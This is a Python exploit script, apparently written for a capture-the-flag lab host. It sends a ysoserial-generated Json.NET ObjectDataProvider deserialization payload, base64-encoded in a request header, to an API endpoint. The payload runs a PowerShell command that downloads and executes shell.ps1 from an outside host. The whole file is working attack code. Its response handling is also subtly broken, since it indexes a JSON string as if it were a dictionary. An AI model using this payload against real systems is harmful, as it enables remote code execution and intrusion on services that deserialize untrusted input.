import requests
import base64
import json

url = "http://10.10.10.158/api/account"


# TODO: add check in command for single quotes (')
command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14:8000/shell.ps1')"

# Generated using:
#   > .\ysoserial.exe -o raw -g ObjectDataProvider -f Json.net -c "<COMMAND>"
payload = """
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", 
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd","/c <COMMAND>"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"},
    "m_userToken": 0
}
"""

# Replacing values
payload = payload.replace('<COMMAND>', command)

payload_encode = base64.b64encode(str.encode(payload)).decode("utf-8")

print("[!] Sending payload...")

r = requests.get(url, headers={'Bearer': payload_encode})
r_json = json.dumps(r.text)

print(r_json["ExceptionMessage"])

print("[!] Payload executed!")